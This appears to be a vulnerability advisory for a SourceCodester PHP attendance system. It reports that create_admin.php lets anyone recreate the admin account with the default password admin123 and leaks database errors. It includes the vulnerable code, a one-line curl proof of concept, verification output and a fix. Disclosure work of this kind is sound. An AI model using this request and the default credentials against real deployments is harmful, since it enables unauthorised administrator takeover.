# VULN-02 — Unauthenticated Administrator Account Creation (create_admin.php)

> **Audit by:** EVA Security Research
> **Product:** Smart Attendance System with QR Code Scanner (SourceCodester #18702), v1.0 — PHP/MySQL (PDO), developer Gon13
> **Audit date:** 2026-10-17 | **Verification:** local deployment, PHP 7.3.4 + MySQL 5.7.26

## 1. Vulnerability Overview / Summary
create_admin.php creates the default administrator account admin/admin123 (and creates the users table on the fly) when opened in a browser, with no authentication of any kind. An unauthenticated attacker can recreate the admin account with the well-known default password after deletion, and the page additionally leaks raw PDO error messages.

## 2. Affected Component & Version
- **Component:** `create_admin.php (lines 2-26; credentials lines 14-15, error echo line 24)`
- **Product:** Smart Attendance System with QR Code Scanner (SourceCodester #18702), v1.0. No patched version exists.

## 3. Vulnerability Type & Risk Level
- **Class (VulDB):** Missing Authentication for Critical Function
- **CWE-306: Missing Authentication for Critical Function**
- **Severity:** Critical
- **CVSS 3.1 vector:** `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` — **9.1**

## 4. Vulnerability Location (file:line)
```php
// create_admin.php
require 'includes/db.php';                 // line 4 - no auth gate

$pdo->exec("CREATE TABLE IF NOT EXISTS users (...)");   // line 7

$username = 'admin';                       // line 14 hard-coded
$password = 'admin123';                    // line 15 hard-coded, publicly documented
$hash = password_hash($password, PASSWORD_DEFAULT);
try {
    $stmt = $pdo->prepare("INSERT INTO users (username, password) VALUES (?, ?)");  // line 19
    $stmt->execute([$username, $hash]);                                            // line 20
    echo "<h3>Success!</h3>...";                                                   // line 21
} catch (PDOException $e) {
    echo "<h3>User already exists or Error:</h3> " . $e->getMessage();             // line 24 - raw SQL error disclosure
```

## 5. Root Cause Analysis
A bootstrap/installer utility was left inside the web root. It performs DDL and account provisioning on every GET request with no session check, and its error branch echoes the PDO exception message (schema details, constraint names) to anonymous visitors.

## 6. Preconditions
None. Network access to the application.

## 7. Reproduction Steps
1. Browse to create_admin.php (single GET, no parameters, no session).
2. If the admin row was deleted or the password was changed, the script re-inserts admin/admin123.
3. Log in with admin/admin123.
4. (Info leak) The catch branch prints the raw PDO message, confirming DB state to anonymous users.

## 8. PoC / EXP
```bash
# Unauthenticated admin (re)creation
curl -s "http://<TARGET>/create_admin.php"

# Response on repeat call (error leak):
#   User already exists or Error: SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'admin' for key 'username'
```

## 9. Verification Results
Executed against the local deployment:

  GET /smart_attendance/create_admin.php  (no cookie) -> 200
  Response body: "User already exists or Error: SQLSTATE[23000]: ... Duplicate entry 'admin' for key 'username'"
  -> The provisioning logic executed unauthenticated and the PDO error message (schema/constraint detail) was disclosed.

## 10. Impact
An attacker can (re)create the administrator account with the publicly documented default credentials at any time, defeating password rotation. The bundled error output discloses database schema details to anonymous users, aiding further attacks.

## 11. Remediation
```php
<?php
// Remove create_admin.php from the web root after installation, or gate it:
require 'includes/auth.php';
if (($_SESSION['username'] ?? '') !== 'admin') { http_response_code(403); exit; }
// never echo $e->getMessage() to the client - log it server-side instead.
```
- Ship installers outside the document root, or make them self-delete after first run.
- Force a password change on first login.

## 12. References & Timeline
- **Audit by:** EVA Security Research
- **Identification:** 2026-10-17
- **Vendor notification:** not yet sent (SourceCodester is a distribution portal; no vendor patch process exists)
- **CVE:** TBD (submission package for the VulDB workflow)
